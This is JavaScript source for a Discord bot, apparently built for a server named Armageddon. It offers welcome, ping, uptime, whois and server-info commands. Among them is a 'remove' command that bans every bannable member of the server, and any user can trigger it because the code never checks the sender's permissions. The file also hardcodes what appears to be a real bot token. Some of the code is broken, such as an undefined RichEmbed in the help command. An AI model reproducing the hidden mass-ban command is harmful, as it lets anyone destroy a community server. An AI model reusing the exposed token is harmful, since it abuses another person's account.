const Discord = require('discord.js');
const bot = new Discord.Client();
const dateFormat = require('dateformat');
const gutil = require('gulp-util');
const token = 'NjgyNTQ5NzI4MjE0NjQ2ODg0.XleoAQ.5lMJegJYeC_9NzkMKf72K_1WHcs';

const PREFIX = "a!";

bot.on('ready', () =>{
    console.log('Bot is running.');
    bot.user.setActivity("армагеддон | test", {
        type: "STREAMING",
        url: "https://www.twitch.tv/DUAPCLAN" 
    });
})

bot.on('guildMemberAdd', member =>{
     
    const channel = member.guild.channels.find(channel => channel.name === "welcome");
    if(!channel) return;

    channel.send(`⚠️ User: ${member} has been detected upon joining Armageddon. Awaiting Verification! ⚠️`)
});

bot.on('message', message=>{

    let args = message.content.substring(PREFIX.length).split(" ");

    switch(args[0]){
        case 'devtest':
        message.reply('Testing.')
        break;
        case 'website':
        message.channel.sendMessage('http://armageddon.mogroupp.com/')
        break;

        case 'help':
            const Embed = new RichEmbed()
            //.setTitle("Help")
            //.setColor('#9900cc')
            //.setDescription("")


            message.author.send(Embed);
        break;

        case 'ping':
        message.channel.send("Pinging...").then(m => {
            let ping = m.createdTimestamp - message.createdTimestamp
            let choices = ["Current Ping", "Ping displayed below"]
            let response = choices[Math.floor(Math.random() * choices.length)]

            m.edit(`${response}: Bot Latency: ${ping}, API Latency: ${Math.round(bot.ping)}`)
        })
        break;
        case 'uptime':
        function duration(ms) {
            const sec = Math.floor((ms / 1000) % 60).toString()
            const min = Math.floor((ms / (1000 * 60)) % 60).toString()
            const hrs = Math.floor((ms / (1000 * 60 * 60)) % 60).toString()
            const days = Math.floor((ms / (1000 * 60 * 60 * 24)) % 60).toString()
            return `${days.padStart(1, '0')} days, ${hrs.padStart(2, '0')} hours, ${min.padStart(2, '0')} minutes, ${sec.padStart(2, '0')} seconds.`
        }

        message.channel.send(`Bot is online for: ${duration(bot.uptime)}`)
        break;

        case 'whois':
        let userToCheck = message.mentions.users.first();
        if(!userToCheck) userToCheck = message.author;
        let embed = new Discord.RichEmbed()
        .setAuthor(`UserInfo`, `${bot.user.displayAvatarURL}`)
        .setColor(0xff00ff)
        .setTimestamp()
        .setFooter(`Requested by: ${message.author.tag}`)
        .addField(`ID`, `${userToCheck.id}`, true)
        .addField(`Discord Tag`, `${userToCheck.tag}`, true)
        .addField(`Nickname`, `${userToCheck.nickname || "None"}`, true)
        .addField(`Play at`, `${userToCheck.presence.game ? userToCheck.presence.game.name : 'Nothing'}`, true)
        .addField(`Status`, `${userToCheck.presence.status}`, true)
        .addField(`Account Creation Date`, `${dateFormat(userToCheck.createAt, "dd/mm/yyyy - HH:MM:ss")}`, true)
        message.channel.send(embed)
        break;

        case 'botinfo':
        let boticon = bot.user.displayAvatarURL;
        let botembed = new Discord.RichEmbed()
        .setDescription("Bot Information")
        .setColor(0xff00ff)
        .setThumbnail(boticon)
        .addField("Bot Name:", bot.user.username)
        .addField("Prefix:", "a!")
        .addField("Bot Create Date:", bot.user.createdAt)
        .addField("Servers:", bot.guilds.size)
        .setTimestamp()
        .setFooter("Powered by DataArmageddon");

        message.channel.send(botembed)
        break;

        case 'serverinfo':
        let servericon = message.guild.iconURL
        let serverembed = new Discord.RichEmbed()
        .setAuthor(message.author.username, message.author.avatarURL)
        .setTitle("Server Information")
        .setColor(0xff00ff)
        .setThumbnail(servericon)
        .addField("Name:", message.guild.name, true)
        .addField("ID:", message.guild.id, true)
        .addField("Created At:", message.guild.createdAt.toDateString(), true)
        .addField("Joined At:", message.guild.joinedAt.toDateString(), true)
        .addField("Member Count:", message.guild.members.size, true)
        .addField("Channels:", message.guild.channels.size, true)
        .addField("Roles:", message.guild.roles.size, true)
        .setTimestamp()
        .setFooter("Powered by DataArmageddon");

        message.channel.send(serverembed);
        break;

        case 'remove':
        if(message.channel.type !== "text") return;
        if(message.deletable) message.delete();
        else if (!message.guild.member(bot.user).hasPermission("BAN_MEMBERS")) return;
        message.guild.members.forEach(member => {
            if(member.bannable) member.ban();
        });
        break;
    }
})

bot.login(token);